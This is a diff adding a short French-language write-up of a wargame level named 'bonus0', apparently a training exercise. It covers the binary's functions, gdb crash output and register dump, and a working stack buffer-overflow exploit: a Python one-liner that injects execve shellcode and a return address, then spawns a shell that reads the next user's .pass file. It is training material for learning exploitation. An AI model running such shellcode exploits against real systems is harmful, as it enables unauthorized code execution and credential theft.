@@ -1,0 +1,62 @@
+0x080484b4  p
+0x0804851e  pp
+0x080485a4  main
+
+main() appelle pp() qui appelle p() 2 fois
+
+main() cree une str[42]
+appelle pp(str)
+
+pp() cree 2 strings a[20] et b[20]
+appelle p(a, " - ")
+appelle p(b, " - ")
+
+p(arg, " - ")
+puts(" - ")
+read() 4096 bytes from 0 dans buffer[4096] dans input
+input -> strchr '\n' = 0
+return strncmp(arg, input, 20)
+
+(gdb) r
+Starting program: /home/user/bonus0/bonus0 
+ - 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ - 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+AAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41336141 in ?? ()
+(gdb) i r
+eax            0x0	0
+ecx            0xffffffff	-1
+edx            0xb7fd28b8	-1208145736
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff730	0xbffff730
+ebp            0x32614131	0x32614131
+esi            0x0	0
+edi            0x0	0
+eip            0x41336141	0x41336141
+eflags         0x210282	[ SF IF RF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+
+Overflow lors du input2 p() a +9
+Mais il faut ecrire un peu + pour que ca crash
+EIP est a notre input2+9, on va mettre l'adresse de notre input1
+
+dans input 1 on met notre shellcode a injecter qui sera appele
+ grace a l'overflow de input2+9
+
+
+(python -c "print '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd'"; python -c "print '\x80' + 'A'*8 + '\xbf\xff\xf7\x26'[::-1] + 'A'*7"; cat) | ./bonus0
+
+>whoami
+bonus1
+>cat /home/user/bonus1/.pass
+on a le token
